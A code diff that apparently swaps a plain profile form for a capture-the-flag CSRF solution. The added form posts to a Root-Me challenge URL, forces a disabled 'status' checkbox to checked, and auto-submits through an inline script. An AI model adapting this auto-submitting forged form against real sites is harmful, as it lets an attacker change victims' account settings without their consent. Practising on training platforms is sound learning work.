@@ -1,18 +1,6 @@
-<div>
-<fieldset>
-	<legend>Update Profile</legend>
-	<form action="?action=profile" method="post" enctype="multipart/form-data">
-		<div class="form-group">
-			<label>Username:</label>
-			<input type="text" name="username" value="hacker">
-		</div>
-		<br>		
-		<div class="form-group">
-			<label>Status:</label>
-			<input type="checkbox" name="status" disabled="">
-		</div>
-		<br>	
-		<button type="submit">Submit</button>
-	</form>
-</fieldset>
-</div>
+<form  name="csrf" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+  <input type="text" name="username" value="test" />
+  <input type="checkbox" name="status" checked=checked />
+  <input type="submit" value="Submit request" />
+</form>
+<script>document.csrf.submit()</script>
